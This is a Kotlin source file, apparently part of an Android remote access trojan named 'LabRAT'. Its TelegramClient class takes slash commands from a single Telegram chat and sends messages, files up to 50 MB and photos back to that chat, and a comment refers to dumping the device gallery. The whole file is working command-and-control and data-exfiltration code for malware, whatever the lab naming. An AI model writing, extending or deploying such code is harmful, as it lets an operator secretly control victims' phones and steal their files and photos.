package com.lab.rat.core

import android.util.Log
import kotlinx.coroutines.delay
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class TelegramClient(private val onCommand: (String) -> Unit) {

    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(35, TimeUnit.SECONDS)
        .build()
    private val sendMutex = Mutex()
    private var offset = 0L

    private fun url(method: String) =
        "https://api.telegram.org/bot${Config.BOT_TOKEN}/$method"

    private fun api(method: String, params: Map<String, String>): JSONObject {
        val form = okhttp3.FormBody.Builder()
        params.forEach { (k, v) -> form.add(k, v) }
        http.newCall(Request.Builder().url(url(method)).post(form.build()).build())
            .execute().use { return JSONObject(it.body!!.string()) }
    }

    private fun apiMultipart(method: String, body: okhttp3.RequestBody) {
        http.newCall(Request.Builder().url(url(method)).post(body).build())
            .execute().use { }
    }

    suspend fun sendText(text: String) {
        if (Config.BOT_TOKEN.isEmpty() || Config.CHAT_ID.isEmpty()) return
        for (chunk in text.chunked(4000)) {
            sendMutex.withLock {
                runCatching {
                    api("sendMessage", mapOf(
                        "chat_id" to Config.CHAT_ID,
                        "text" to chunk
                    ))
                }.onFailure { Log.e("LabRAT", "sendMessage", it) }
                delay(3200) // ~18 msg/min, margem segura
            }
        }
    }

    suspend fun sendDocument(file: File, caption: String = ""): Boolean {
        if (Config.BOT_TOKEN.isEmpty() || Config.CHAT_ID.isEmpty()) return false
        if (!file.exists() || file.length() > Config.MAX_DOC_BYTES) {
            sendText("Arquivo ${file.name} ausente ou excede 50 MB"); return false
        }
        sendMutex.withLock {
            runCatching {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", Config.CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", file.name,
                        file.asRequestBody("application/octet-stream".toMediaType()))
                    .build()
                apiMultipart("sendDocument", body)
            }.onFailure { Log.e("LabRAT", "sendDocument", it) }
            delay(3200)
        }
        return true
    }

    suspend fun sendPhoto(file: File, caption: String = ""): Boolean {
        if (Config.BOT_TOKEN.isEmpty() || Config.CHAT_ID.isEmpty()) return false
        if (!file.exists() || file.length() > Config.MAX_PHOTO_BYTES) {
            sendText("Arquivo ${file.name} ausente ou excede 10 MB"); return false
        }
        sendMutex.withLock {
            runCatching {
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", Config.CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("photo", file.name,
                        file.asRequestBody("image/jpeg".toMediaType()))
                    .build()
                apiMultipart("sendPhoto", body)
            }.onFailure { Log.e("LabRAT", "sendPhoto", it) }
            delay(3200) // NÃO reduzir: estoura rate-limit no /gallery dump
        }
        return true
    }

    suspend fun pollLoop() {
        while (true) {
            if (Config.BOT_TOKEN.isEmpty() || Config.CHAT_ID.isEmpty()) {
                delay(5000); continue // evita CPU 100% sem token
            }
            runCatching {
                val req = Request.Builder()
                    .url(url("getUpdates") + "?timeout=25&offset=$offset" +
                            "&allowed_updates=%5B%22message%22%5D")
                    .get().build()
                http.newCall(req).execute().use { r ->
                    val json = JSONObject(r.body!!.string())
                    val updates: JSONArray = json.optJSONArray("result") ?: return@use
                    for (i in 0 until updates.length()) {
                        val u = updates.getJSONObject(i)
                        offset = u.getLong("update_id") + 1
                        val msg = u.optJSONObject("message") ?: continue
                        val chatId = msg.optJSONObject("chat")?.optString("id") ?: continue
                        if (chatId != Config.CHAT_ID) continue
                        val text = msg.optString("text")
                        if (text.startsWith("/")) onCommand(text.trim())
                    }
                }
            }.onFailure { Log.e("LabRAT", "poll", it); delay(5000) }
        }
    }
}
